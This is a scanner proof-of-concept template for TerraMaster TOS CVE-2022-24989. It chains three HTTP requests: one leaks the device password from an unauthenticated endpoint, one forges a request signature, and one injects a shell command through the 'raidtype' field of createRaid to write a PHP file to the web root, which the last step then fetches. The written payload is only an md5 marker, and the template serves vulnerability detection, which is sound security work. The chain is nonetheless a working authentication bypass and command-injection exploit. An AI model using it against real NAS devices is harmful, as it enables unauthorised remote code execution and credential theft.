name: poc-yaml-terramaster-tos-cve-2022-24989
manual: true
transport: http
set:
    f1: string(randomInt(10000, 90000))
    f2: md5(string(randomInt(20000, 50000)))
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /module/api.php?mobile/webNasIPS
            headers:
                User-Agent: TNAS
            follow_redirects: false
        expression: response.status == 200 && response.body.bcontains(bytes("NOTIFY Message")) && response.body.bcontains(bytes("PWD:")) && response.body.bcontains(bytes("SAT:"))
        output:
            search: |
                "PWD:(?P<PWD>.*)\\\\nSAT".bsubmatch(response.body)
            PWD: search["PWD"]
            search1: |
                "ADDR:(?P<ADDR>.*)\\\\nPWD".bsubmatch(response.body)
            ADDR: substr(search1["ADDR"], 6, 6)
            sign: md5(ADDR + "2647818745")
    r1:
        request:
            cache: true
            method: POST
            path: /module/api.php?mobile/createRaid
            headers:
                Authorization: '{{PWD}}'
                Content-Type: application/x-www-form-urlencoded
                Signature: '{{sign}}'
                Timestamp: "2647818745"
                User-Agent: TNAS
            body: raidtype=%3Becho+%22%3C%3Fphp+echo+md5({{f1}})%3B%3F%3E%22%3E{{f2}}.php&diskstring=XXXX
            follow_redirects: false
        expression: response.status == 200 && response.body.bcontains(bytes("createRaid successful"))
    r2:
        request:
            cache: true
            method: GET
            path: /module/{{f2}}.php
            headers:
                User-Agent: TNAS
            follow_redirects: false
        expression: response.status == 200 && response.body.bcontains(bytes(md5(f1)))
expression: r0() && r1() && r2()
detail:
    author: 2husky
    links:
        - https://www.redpacketsecurity.com/terramaster-tos-command-execution-cve-2022-24989/
    vulnerability:
        id: CT-437890
        level: critical
    warning: 注意该脚本会上传文件产生一个临时的无害文件
